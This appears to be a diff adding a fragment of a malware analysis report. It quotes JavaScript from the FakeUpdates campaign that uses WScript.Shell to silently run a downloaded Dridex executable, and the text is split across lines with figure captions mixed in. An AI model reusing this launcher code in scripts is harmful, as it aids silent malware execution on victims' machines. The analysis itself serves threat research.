@@ -1,0 +1,6 @@
+
+Sleep(3 * 1000); runFileResult = wsh.
+Run('\"' + _tempFilePathExec + '\"'); lastException = ''; } catch (error) { lastException = error.number; runFileExeption += 'error number:' + error.number + ' message:' + error.message; } } Figure 7:
+Code excerpt observed in FakeUpdates used to launch Dridex payloads function runFile() { var lastException = ''; try { var wsh = new ActiveXObject(\"WScript.
+Shell\"); runFileResult = wsh.
+Run('\"' + _tempFilePathExec + '\" /verysilent'); lastException = ''; } catch (error) { lastException = error.number; runFileExeption += 'error number:' + error.number + ' message:' + error.message; } } Figure 8:
